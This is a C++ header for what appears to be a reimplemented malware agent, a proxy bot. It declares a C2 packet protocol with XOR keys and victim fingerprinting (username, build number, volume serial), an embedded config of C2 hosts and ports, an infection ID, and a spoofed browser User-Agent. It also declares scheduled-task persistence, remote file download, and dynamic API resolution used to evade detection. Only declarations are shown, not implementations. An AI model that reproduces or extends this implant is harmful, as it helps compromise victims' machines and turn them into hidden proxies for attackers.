#pragma once
#define SECURITY_WIN32

#include <phnt_windows.h>
#include <phnt.h>
#include <mstask.h>
#include <security.h>
#include <secext.h>
#include <WinSock2.h>
#include <mstcpip.h>
#include <cstdio>
#include <cstdint>
#include <cassert>
#include <ws2tcpip.h>
#include <windns.h>
#include <malloc.h>
#include <credssp.h>
#include <wincred.h>
#include <schannel.h>
#include <shellapi.h>
#include <cstring>
#include <Psapi.h>
#include <synchapi.h>

#undef UNICODE
#include <TlHelp32.h>

#pragma pack(push, 1)
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Secur32.lib")

#define ArraySize(a) (sizeof(a) / sizeof((a)[0]))
#define MS_TO_FT_INTERVALS(ms) ((ms) * 1'000'000 * 100)
#define SHUTDOWN_AGENT 0x4A
#define MAIN_SOCKET 0x00

#define SECONDS(n) (n) * 1000
#define MINUTES(n) 60 * SECONDS(n)
#define HOURS(n) 60 * MINUTES(n)
#define DAYS(n) 24 * HOURS(n)

enum address_type_t : uint8_t
{
	IPv4 = 1,
	Domain = 3,
	IPv6 = 4,
};

struct packet_header_t
{
	union
	{
		struct
		{
			bool established_connection;
			uint8_t socket_index;
		};

		uint16_t value;
	};

	uint16_t length;
};

struct data_packet_t
{
	packet_header_t header;
	uint8_t data[1];
};

struct data_packet_response_t
{
	uint8_t socket_index;
	uint16_t length;
	uint8_t data[1];
};

struct file_download_response_t
{
	uint8_t magic;
	uint16_t length;
	uint32_t file_download_id;
};

struct control_packet_t
{
	packet_header_t header;

	union
	{
		struct
		{
			uint32_t file_download_id;
		};

		struct
		{
			uint8_t _[3];
			address_type_t addr_type;
		};
	};

	union
	{
		struct
		{
			uint8_t url[1];
		} file_download;

		// New Proxy connection passing domain name
		struct
		{
			uint8_t domain_name_len;
			uint8_t domain[1];
		} domain_connect;

		// New Proxy connection passing IPv4 Address
		struct
		{
			uint32_t ipv4;
			uint16_t port;
		} ip4_connect;

		// New Proxy connection passing IPv6 Address
		struct
		{
			uint8_t ipv6[16];
			uint16_t port;
		} ip6_connect;
	} payload;
};

struct hello_packet_t
{
	uint8_t xor_key[50];
	char windows_build_number[3];
	bool is_wow64;
	char username[41 + 1];
	uint32_t volume_serial_number;
};

struct proxy_context_t
{
	control_packet_t control;
	HANDLE *threads;

	char _[358];
	int socket_index;
	HANDLE event;
	SOCKET *sockets;
	void *self;
};

struct socket_set_t
{
	uint32_t count;
	SOCKET sockets[2];
	timeval timeout;
};

// Addresses are changed so I can test without infecting my machine.
struct Config
{
	char Begin[sizeof("BEGINDATA")] = "BEGINDATA";
	char Host1[sizeof("HOST1:127.0.0.1")] = "HOST1:127.0.0.1";
	char _0[28];
	char Host2[sizeof("HOST2:127.0.0.1")] = "HOST2:127.0.0.1";
	char _1[28];
	char Port1[sizeof("PORT1:4001")] = "PORT1:4001";
	char _2[1];
	char Dns1[sizeof("DNS1:1.1.1.1")] = "DNS1:1.1.1.1";
	char _3[28];
	char Dns2[sizeof("DNS2:ns1.google.com")] = "DNS2:ns1.google.com";
	char _4[28];
	char Dns3[sizeof("DNS3:ns2.google.com")] = "DNS3:ns2.google.com";
};

static uint8_t g_xor_key[50] = {'x', 'o', 'r', 'd', 'a', 't', 'a'};
static Config g_config;
static char g_infection_id[10] = {0};

static char g_http_request[] =
	"GET %s HTTP/1.0\r\n"
	"Host: %s\r\n"
	"User-Agent: Mozilla / 5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko / 20100101 Firefox / 66.0\r\n"
	"Accept:*/*\r\n"
	"Connection: close\r\n"
	"\r\n";

void windows_ts_delete_task(char *task_name);
void windows_ts_create_task(char* task_name, char* binary_path, char* parameters, bool low_delay, bool run_immediatly);
bool windows_is_process_running(char *process_name);
DWORD windows_get_build_number();

bool strings_str_equal(const char* s1, const char* s2);
bool strings_end_with_a_number(const char *str);

void utils_hexdump(uint8_t *data, size_t size, bool hex_stream);

void net_socket_init(int sock1, int sock2, socket_set_t *socket_set, timeval timeout);
int net_socket_send(SOCKET socket, void *data, size_t len, HANDLE event);
int net_socket_recv(SOCKET s, void *buf, int len, int timeout);
void net_socket_set_nonblocking(SOCKET socket, u_long enable);
void net_socket_close(SOCKET socket);
in_addr net_dns_resolve(const char* domain, int family);
size_t net_download_file(const char *url, void **filebufp);
size_t net_http_download_file(const char* host, size_t port, const char* filepath, void** filebufp);
size_t net_tls_download_file(const char* host, size_t port, const char* filepath, void** filebuffer);
SOCKET net_tls_connect(const char* host, uint32_t port, PCtxtHandle context, PCredHandle cred, SOCKET& socket);
void net_tls_send(SOCKET socket, void* data, int len, HANDLE event, PCtxtHandle phContext);
size_t net_tls_recv(SOCKET socket, void** pbuffer, PCtxtHandle context);
void net_tls_disconnect(PCtxtHandle context, PCredHandle cred, SOCKET socket);

template <typename T>
void utils_swap(T &a, T &b)
{
	T t = a;
	a = b;
	b = t;
}

void memory_free(void **p);
void* memory_buffer_resize(void** buffer, size_t buffer_old_size, size_t new_buffer_size);
void* memory_buffer_append(void** buf1, size_t buf1_size, void* buf2, size_t buf2_size);
void memory_zero(void *buf, size_t size);

int rand_get_string(char *buf);
int rand_get_number(int cap);

void agent_create_persistance_directory(char *infection_id, char *path);
DWORD WINAPI agent_proxy_routine(LPVOID lpThreadParameter);
int agent_main_loop(char *addr, uint16_t port);
LRESULT WINAPI agent_window_proc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
DWORD WINAPI agent_create_window(LPVOID param);

void fs_create_file(char* filename, void* filedata, uint32_t filesize, uint32_t creation_disposition, uint32_t move_method);

void *windows_load_dll(const char *dll_name);
void *windows_resolve_api(void *module_base, const char *api_name);